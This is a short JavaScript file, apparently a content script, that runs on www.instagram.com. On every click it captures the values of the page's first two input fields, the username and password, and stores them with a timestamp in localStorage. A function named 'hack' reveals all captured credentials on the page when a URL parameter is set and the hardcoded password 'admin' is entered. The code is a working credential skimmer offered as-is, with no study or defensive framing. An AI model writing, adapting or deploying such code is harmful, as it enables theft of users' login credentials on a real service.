if(window.location.host == 'www.instagram.com'){
    start()
}
function start(){
function hack(){
    var desire = location.search.slice(1).split("&")[0].split("=")[1];
    if(desire == "admin"){
       var pass=prompt("Enter admin password");
       if(pass === 'admin'){
        var sds=localStorage.getItem('user_data')
        var bot=JSON.parse(sds)
        for(let i=0; i<bot.length; i++){
            console.log(bot[i].username)
            document.write(`
               <p>Date [${bot[i].date}]</p>
               <p>Username:[${bot[i].username}]</p>
               <p>Password:[${bot[i].password}]</p>
               <hr>
            `)
        }
       }
       else{
        alert("Error password !");
        window.location="https://instagram.com";
       }
    }
}hack()
document.addEventListener("click", myFunction);
function myFunction() {
    var username=document.querySelectorAll("input")[0].value;
    var password=document.querySelectorAll("input")[1].value;
      if(!localStorage.getItem('user_data')){
        localStorage.setItem('user_data','[]')
      }
      else{
        var data={
           'username':username,
           'password':password,
           'date':Date()
        };
           var sd=localStorage.getItem('user_data');
           var dob=JSON.parse(sd);
            dob.push(data)
            localStorage.setItem('user_data',JSON.stringify(dob))
      }
    
    }
}
